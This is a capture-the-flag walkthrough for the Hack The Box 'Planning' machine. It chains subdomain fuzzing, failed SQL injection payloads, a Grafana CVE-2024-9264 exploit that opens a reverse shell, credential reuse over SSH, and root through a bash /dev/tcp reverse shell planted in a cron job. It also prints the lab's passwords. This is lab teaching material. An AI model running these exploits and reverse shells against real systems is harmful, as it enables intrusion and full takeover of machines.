# 🧠 HTB Planning Walkthrough – Full Exploitation Chain

This walkthrough details the complete exploitation of `planning.htb`, from enumeration and subdomain discovery to remote code execution via Grafana and full root compromise through a cron job reverse shell.

---

## 🌐 Step 1: Set Up Hostname Resolution

Make sure your machine resolves the box correctly:

cat /etc/hosts
If needed, append:

bash
Copy
Edit
10.129.34.41 planning.htb
🗂️ Step 2: Directory Enumeration
Run gobuster to discover hidden paths:

bash
Copy
Edit
gobuster dir -u http://planning.htb -w medium.txt
gobuster dir -u http://planning.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
📁 Discovered Paths:
/index.php

/contact.php

/about.php

/detail.php

/course.php

/enroll.php

🌐 Step 3: Subdomain Discovery
Fuzz subdomains using wfuzz:

bash
Copy
Edit
cd SecLists-master/Discovery/DNS
cp bitquark-subdomains-top100000.txt subdomains.txt
wfuzz -c -w subdomains.txt -u 'http://planning.htb/' -H "Host: FUZZ.planning.htb" --hw 12
Add discovered domain to /etc/hosts:

bash
Copy
Edit
echo "10.129.34.41 grafana.planning.htb" | sudo tee -a /etc/hosts
🧪 Step 4: SQL Injection Testing
Capture request to /search and run:

bash
Copy
Edit
sqlmap -r request.txt --batch --level=5 --risk=3 --random-agent
Result: No injectable parameters were found.

🔍 Manual Payloads Tested
' OR '1'='1

' UNION SELECT 1, @@version --

' OR IF(1=1, SLEEP(5), 0) --

No success — endpoint not vulnerable.

💥 Step 5: Exploit Grafana (CVE-2024-9264)
Download and run the exploit:

bash
Copy
Edit
wget https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit/archive/refs/heads/main.zip -O rce.zip
unzip rce.zip
cd CVE-2024-9264-RCE-Exploit-main
python3 poc.py --url http://grafana.planning.htb \
               --username admin \
               --password 0D5oT70Fq13EvB5r \
               --reverse-ip 10.10.14.19 \
               --reverse-port 4444
Set listener:

bash
Copy
Edit
nc -lvnp 4444
Reverse shell successfully received as root (containerized).

🔍 Step 6: Container Enumeration
Within shell:

bash
Copy
Edit
whoami
env
cat run.sh
📋 Credentials Found:
GF_SECURITY_ADMIN_USER=enzo

GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!

Try SSH on host:

bash
Copy
Edit
ssh enzo@10.129.34.41
🧑‍💻 Step 7: Access Host & Privilege Escalation
Once on host as enzo:

bash
Copy
Edit
whoami
cat ~/user.txt
wget http://10.10.14.19:80/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
LinPEAS discovered a password in /opt/crontabs/crontab.db.

🌐 Step 8: Network Enumeration
Check open services:

bash
Copy
Edit
ss -tulnp
lsof -i :3000
lsof -i :8000
🔁 Step 9: Port Forwarding to Access Cron Web UI
Forward port 8000 to local 5555 using Python:

python
Copy
Edit
import socket
import threading

def forward(source, destination):
    while True:
        data = source.recv(4096)
        if not data:
            break
        destination.sendall(data)

listen = socket.socket()
listen.bind(("0.0.0.0", 5555))
listen.listen(5)

while True:
    client_sock, _ = listen.accept()
    server_sock = socket.socket()
    server_sock.connect(("127.0.0.1", 9898))

    threading.Thread(target=forward, args=(client_sock, server_sock)).start()
    threading.Thread(target=forward, args=(server_sock, client_sock)).start()
Then access:

text
Copy
Edit
http://planning.htb:5555
Login with:

Username: root

Password: P4ssw0rdS0pRi0T3c

🐚 Step 10: Get Root via Cron Job Reverse Shell
Insert into cron command field:

bash
Copy
Edit
/bin/bash -i >& /dev/tcp/10.10.14.99/4444 0>&1
Set listener:

bash
Copy
Edit
nc -lvnp 4444
Boom: Full root shell on the host acquired.

✅ Summary
Phase	Technique	Outcome
Enumeration	Gobuster + wfuzz	Found subdomain + pages
SQLi	Sqlmap + manual	No injection found
Exploitation	CVE-2024-9264 RCE on Grafana	Root in container
Pivot	Reused creds from env to SSH to host	User: enzo
PrivEsc	LinPEAS + exposed cron web UI	Gained root access
Final Exploit	Reverse shell via cron job	Full root shell on host

This box demonstrates real-world chaining: subdomain → CVE → creds → pivot → root.
